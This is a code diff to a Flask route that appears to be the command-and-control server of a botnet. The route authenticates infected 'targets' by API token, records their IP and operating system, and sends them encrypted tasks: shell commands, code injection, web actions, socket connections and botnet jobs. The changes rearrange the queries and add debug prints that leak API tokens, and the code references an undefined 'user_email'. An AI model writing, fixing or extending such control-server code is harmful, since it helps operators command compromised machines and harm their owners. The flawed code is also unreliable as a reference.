@@ -28,6 +28,7 @@ from flask import Blueprint, jsonify, request
 from sqlalchemy.orm import sessionmaker
 from datetime import datetime
 from Crypto.Cipher import AES
+import traceback
 import base64
 import json
 import os
@@ -306,46 +307,50 @@ def instarction(target_name):
             data = decrypt_payload(request.args)
 
             token = data.get('token')
+            print("token:", token)
             if not token:
                 return jsonify(encrypt_payload({'error': 'please provide a valid api token. currently no api token provided'})), 403
             IP = data.get('ip')
             opratingSystem = data.get('os')
             valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
+            instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, status=config.STUTAS[0]).all(), sp=',')
+            user_instractions = getlist(_session.query(Instruction_Detail).filter_by(userEmail=user_email).all(), sp=',')
 
-            if len(valid) != 0:
-                instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, stutas=config.STUTAS[0]).all(), sp=',')
-                user_instractions = getlist(_session.query(Instruction_Detail).filter_by(userEmail=user_email).all(), sp=',')
-
+            if len(valid) != 0 and len(instraction) != 0:
+                print(len(instraction), instraction)
+                
                 user_instraction = {
-                    'instraction': instarction[0][3],
-                    'Delay': instarction[0][1],
+                    'instraction': instraction[0][3],
+                    'Delay': instraction[0][1],
                     'user_instarcton':{},
                     'sys_instraction': {}
                 }
                 
-                user_ins = {}
-                for ins in user_instractions:
-                    if ins[3].split(',')[0] == config.INSTRACTION_TYPE[0]:  # CMD
-                        commands = ins[2].split(',')
-                        user_ins['CMD'] = commands
-                    elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[2]:  # CodeInjection
-                        # TODO: handle code injection if needed
-                        pass
-                    elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[3]:  # Web
-                        if ins[3].split(',')[1] == target_name:
-                            user_ins['Web'] = ins[2]
-                    elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[4]:  # Socket
-                        if ins[3].split(',')[1] == target_name:
-                            user_ins['Socket'] = {
-                                'host': ins[6],
-                                'port': ins[5]
-                            }
-                    elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[1]:  # BotNet
-                        if ins[0]:
-                            user_ins['BotNet'] = {ins[3]: [ data for data in ins if data not in config.INSTRACTION_BOTNET_CATEGORY ]}
-                user_instraction['user_instarcton'] = user_ins
+                if len(user_instractions) != 0:
+                    user_ins = {}
+                    for ins in user_instractions:
+                        if ins[3].split(',')[0] == config.INSTRACTION_TYPE[0]:  # CMD
+                            commands = ins[2].split(',')
+                            user_ins['CMD'] = commands
+                        elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[2]:  # CodeInjection
+                            # TODO: handle code injection if needed
+                            pass
+                        elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[3]:  # Web
+                            if ins[3].split(',')[1] == target_name:
+                                user_ins['Web'] = ins[2]
+                        elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[4]:  # Socket
+                            if ins[3].split(',')[1] == target_name:
+                                user_ins['Socket'] = {
+                                    'host': ins[6],
+                                    'port': ins[5]
+                                }
+                        elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[1]:  # BotNet
+                            if ins[0]:
+                                user_ins['BotNet'] = {ins[3]: [ data for data in ins if data not in config.INSTRACTION_BOTNET_CATEGORY ]}
+                    user_instraction['user_instarcton'] = user_ins
+           
 
-                if len(user_instractions) != 0 and len(instraction) != 0:
+                if len(user_instractions) != 0:
                     if IP != readFromJson('target-info', target_name)['ip']:
                         update_target_info(target_name, IP, opratingSystem)
                     if instraction[0][3] == config.INSTRACTION[1]:  # connectBySocket
@@ -374,12 +379,16 @@ def instarction(target_name):
                                     botnet_details[bot[4]] = {'host': host, 'thread': thread}
                         user_instraction['sys_instraction'] = {'botnet': botnet_details}
                     return jsonify(encrypt_payload(user_instraction)), 200
-                return jsonify(encrypt_payload({'Message': 'No instraction found'})), 404
+                if len(instraction) == 0:
+                    return jsonify(encrypt_payload({'Message': 'No instraction found'})), 404
+                else:
+                    return jsonify(encrypt_payload(user_instraction)), 200
             else:
+                print('------ api_token:', token, valid)
                 return jsonify(encrypt_payload({'Error': 'Invalid api_token. please provide a valid api token'})), 403
         
         except Exception as e:
-            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
+            log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
             return jsonify(encrypt_payload({'Error': f'Exception {str(e)}'})), 500
     else:
         return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provid target name"})), 405
